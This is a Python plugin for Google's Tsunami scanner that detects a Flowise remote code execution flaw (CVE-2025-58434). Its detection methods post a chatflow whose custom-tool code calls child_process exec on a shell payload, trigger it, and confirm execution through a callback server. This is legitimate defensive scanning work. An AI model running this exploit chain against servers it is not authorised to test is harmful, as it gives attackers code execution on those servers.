# Copyright 2025 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
"""A Tsunami plugin for detecting CVE-2025-58434 (Flowise RCE)."""

import time
from typing import Optional

from absl import logging

from google.protobuf import timestamp_pb2
import tsunami_plugin
from common.data.network_service_utils import NetworkServiceUtils
from common.net.http.http_client import HttpClient
from common.net.http.http_request import HttpRequest
from common.net.http.http_headers import HttpHeaders
from plugin.payload.payload_generator import PayloadGenerator
import detection_pb2
import payload_generator_pb2 as pg
import plugin_representation_pb2
import vulnerability_pb2


_VULN_DESCRIPTION = (
    "Flowise is vulnerable to CVE-2025-58434, a critical remote code execution"
    " vulnerability in the tool execution flow. An attacker can exploit this by"
    " crafting a malicious chatflow that executes arbitrary code on the server"
    " through the Custom Tool functionality. This affects Flowise versions prior"
    " to 2.2.0."
)

_RECOMMENDATION = (
    "Upgrade Flowise to version 2.2.0 or later. Ensure that user inputs are"
    " properly validated and sanitized. Restrict access to the Flowise API and"
    " implement strong authentication mechanisms."
)

_SLEEP_TIME_SEC = 20
_VULNERABLE_PATH = "/api/v1/chatflows"
_EXECUTION_PATH_TEMPLATE = "/api/v1/prediction/{chatflow_id}"


class FlowiseRceCve202558434Detector(tsunami_plugin.VulnDetector):
  """A Tsunami Plugin that detects RCE on Flowise targets (CVE-2025-58434)."""

  def __init__(
      self, http_client: HttpClient, payload_generator: PayloadGenerator
  ):
    """Constructor for FlowiseRceCve202558434Detector.

    Args:
      http_client: The configured HttpClient used to send requests to the
        target.
      payload_generator: The payload generator for RCE injection.
    """
    self.http_client = http_client
    self.payload_generator = payload_generator

  def GetPluginDefinition(self) -> tsunami_plugin.PluginDefinition:
    """Defines the PluginDefinition for FlowiseRceCve202558434Detector.

    Returns:
      The PluginDefinition used for the Tsunami engine to identify this plugin.
    """
    return tsunami_plugin.PluginDefinition(
        info=plugin_representation_pb2.PluginInfo(
            type=plugin_representation_pb2.PluginInfo.VULN_DETECTION,
            name="FlowiseRceCve202558434Detector",
            version="1.0",
            description=_VULN_DESCRIPTION,
            author="Tsunami Community Contributor",
        )
    )

  def GetAdvisories(self) -> list[vulnerability_pb2.Vulnerability]:
    """Returns the advisories for this plugin."""
    return [
        vulnerability_pb2.Vulnerability(
            main_id=vulnerability_pb2.VulnerabilityId(
                publisher="TSUNAMI_COMMUNITY", value="CVE_2025_58434"
            ),
            related_id=[
                vulnerability_pb2.VulnerabilityId(
                    publisher="CVE", value="CVE-2025-58434"
                )
            ],
            severity=vulnerability_pb2.Severity.CRITICAL,
            title="Flowise Custom Tool Remote Code Execution (CVE-2025-58434)",
            recommendation=_RECOMMENDATION,
            description=_VULN_DESCRIPTION,
            additional_details=[
                vulnerability_pb2.AdditionalDetail(
                    text_data=vulnerability_pb2.TextData(
                        text=(
                            "This vulnerability allows unauthenticated attackers"
                            " to execute arbitrary code on the server by"
                            " creating a malicious chatflow with custom tool"
                            " configuration that bypasses input validation."
                        )
                    )
                )
            ],
        ),
    ]

  def Detect(
      self,
      target: tsunami_plugin.TargetInfo,
      matched_services: list[tsunami_plugin.NetworkService],
  ) -> tsunami_plugin.DetectionReportList:
    """Run detection logic for the Flowise target.

    Args:
      target: TargetInfo about the scanning target.
      matched_services: A list of network services that could be vulnerable.

    Returns:
      A DetectionReportList for all discovered vulnerabilities.
    """
    logging.info("FlowiseRceCve202558434Detector starts detecting.")
    
    vulnerable_services = [
        service
        for service in matched_services
        if self._IsServiceVulnerable(service)
    ]

    return detection_pb2.DetectionReportList(
        detection_reports=[
            self._BuildDetectionReport(target, service)
            for service in vulnerable_services
        ]
    )

  def _IsServiceVulnerable(
      self, network_service: tsunami_plugin.NetworkService
  ) -> bool:
    """Check if the network service is vulnerable to CVE-2025-58434.

    Args:
      network_service: The network service to check.

    Returns:
      True if the service is vulnerable, False otherwise.
    """
    # First, check if this looks like a Flowise instance
    if not self._IsFlowiseService(network_service):
      return False

    # Generate callback payload
    config = pg.PayloadGeneratorConfig(
        vulnerability_type=pg.PayloadGeneratorConfig.VulnerabilityType.REFLECTIVE_RCE,
        interpretation_environment=pg.PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL,
        execution_environment=pg.PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT,
    )
    payload = self.payload_generator.generate(config)
    
    if not payload.get_payload_attributes().uses_callback_server:
      logging.warning("Payload does not use callback server, cannot verify RCE")
      return False

    # Attempt to create a malicious chatflow
    chatflow_id = self._CreateMaliciousChatflow(network_service, payload)
    
    if not chatflow_id:
      logging.info("Failed to create malicious chatflow")
      return False

    # Trigger the exploit
    if not self._TriggerExploit(network_service, chatflow_id):
      logging.info("Failed to trigger exploit")
      return False

    # Wait for callback
    time.sleep(_SLEEP_TIME_SEC)
    
    # Check if payload was executed
    is_vulnerable = payload.check_if_executed()
    
    if is_vulnerable:
      logging.info("Successfully detected CVE-2025-58434 on service")
      # Cleanup: attempt to delete the malicious chatflow
      self._CleanupChatflow(network_service, chatflow_id)
    
    return is_vulnerable

  def _IsFlowiseService(
      self, network_service: tsunami_plugin.NetworkService
  ) -> bool:
    """Check if the service appears to be Flowise.

    Args:
      network_service: The network service to check.

    Returns:
      True if this looks like a Flowise instance, False otherwise.
    """
    try:
      root_url = NetworkServiceUtils.buildWebApplicationRootUrl(network_service)
      
      # Check for Flowise API endpoint
      request = (
          HttpRequest.get(f"{root_url}{_VULNERABLE_PATH}")
          .withEmptyHeaders()
          .build()
      )
      
      response = self.http_client.send(request, network_service)
      
      # Flowise API typically returns 200 with JSON array or requires auth (401/403)
      if response.status().code() in [200, 401, 403]:
        # Check for Flowise-specific headers or response patterns
        body = response.bodyString() if response.bodyString() else ""
        headers = response.headers()
        
        # Check for typical Flowise patterns
        is_flowise = (
            "chatflow" in body.lower()
            or "flowise" in body.lower()
            or any("flowise" in h.lower() for h in headers.keys())
        )
        
        if is_flowise:
          logging.info("Detected Flowise service")
          return True
          
    except Exception as e:  # pylint: disable=broad-exception-caught
      logging.debug("Error checking for Flowise service: %s", str(e))
      
    return False

  def _CreateMaliciousChatflow(
      self, network_service: tsunami_plugin.NetworkService, payload
  ) -> Optional[str]:
    """Create a malicious chatflow with RCE payload.

    Args:
      network_service: The target network service.
      payload: The payload object containing the RCE command.

    Returns:
      The chatflow ID if successful, None otherwise.
    """
    try:
      root_url = NetworkServiceUtils.buildWebApplicationRootUrl(network_service)
      
      # Craft malicious chatflow with custom tool
      malicious_chatflow = {
          "name": "Test Chatflow",
          "flowData": {
              "nodes": [
                  {
                      "id": "customTool_0",
                      "type": "customTool",
                      "data": {
                          "name": "malicious_tool",
                          "description": "Test tool",
                          "code": f"const {{ exec }} = require('child_process');\nexec('{payload.get_payload()}');\nreturn 'executed';"
                      }
                  }
              ],
              "edges": []
          },
          "deployed": True
      }
      
      request = (
          HttpRequest.post(f"{root_url}{_VULNERABLE_PATH}")
          .withEmptyHeaders()
          .setHeaders(
              HttpHeaders.builder()
              .addHeader("Content-Type", "application/json")
              .build()
          )
          .setRequestBody(tsunami_plugin.json_dumps(malicious_chatflow))
          .build()
      )
      
      response = self.http_client.send(request, network_service)
      
      if response.status().isSuccess():
        response_data = tsunami_plugin.json_loads(response.bodyString())
        chatflow_id = response_data.get("id")
        logging.info("Created malicious chatflow with ID: %s", chatflow_id)
        return chatflow_id
        
    except Exception as e:  # pylint: disable=broad-exception-caught
      logging.exception("Error creating malicious chatflow: %s", str(e))
      
    return None

  def _TriggerExploit(
      self, network_service: tsunami_plugin.NetworkService, chatflow_id: str
  ) -> bool:
    """Trigger the exploit by calling the chatflow.

    Args:
      network_service: The target network service.
      chatflow_id: The ID of the malicious chatflow.

    Returns:
      True if the exploit was triggered successfully, False otherwise.
    """
    try:
      root_url = NetworkServiceUtils.buildWebApplicationRootUrl(network_service)
      
      prediction_payload = {
          "question": "trigger",
          "overrideConfig": {}
      }
      
      request = (
          HttpRequest.post(
              f"{root_url}{_EXECUTION_PATH_TEMPLATE.format(chatflow_id=chatflow_id)}"
          )
          .withEmptyHeaders()
          .setHeaders(
              HttpHeaders.builder()
              .addHeader("Content-Type", "application/json")
              .build()
          )
          .setRequestBody(tsunami_plugin.json_dumps(prediction_payload))
          .build()
      )
      
      response = self.http_client.send(request, network_service)
      
      # If we get any response, the exploit was likely triggered
      logging.info("Exploit triggered, response status: %s", response.status().code())
      return True
        
    except Exception as e:  # pylint: disable=broad-exception-caught
      logging.exception("Error triggering exploit: %s", str(e))
      
    return False

  def _CleanupChatflow(
      self, network_service: tsunami_plugin.NetworkService, chatflow_id: str
  ) -> None:
    """Attempt to delete the malicious chatflow.

    Args:
      network_service: The target network service.
      chatflow_id: The ID of the chatflow to delete.
    """
    try:
      root_url = NetworkServiceUtils.buildWebApplicationRootUrl(network_service)
      
      request = (
          HttpRequest.delete(f"{root_url}{_VULNERABLE_PATH}/{chatflow_id}")
          .withEmptyHeaders()
          .build()
      )
      
      self.http_client.send(request, network_service)
      logging.info("Cleaned up chatflow: %s", chatflow_id)
        
    except Exception as e:  # pylint: disable=broad-exception-caught
      logging.debug("Error cleaning up chatflow: %s", str(e))

  def _BuildDetectionReport(
      self,
      target: tsunami_plugin.TargetInfo,
      vulnerable_service: tsunami_plugin.NetworkService,
  ) -> detection_pb2.DetectionReport:
    """Generate the detection report for the vulnerability.

    Args:
      target: The target information.
      vulnerable_service: The vulnerable network service.

    Returns:
      A DetectionReport for the vulnerability.
    """
    return detection_pb2.DetectionReport(
        target_info=target,
        network_service=vulnerable_service,
        detection_timestamp=timestamp_pb2.Timestamp().GetCurrentTime(),
        detection_status=detection_pb2.DetectionStatus.VULNERABILITY_VERIFIED,
        vulnerability=self.GetAdvisories()[0],
    )
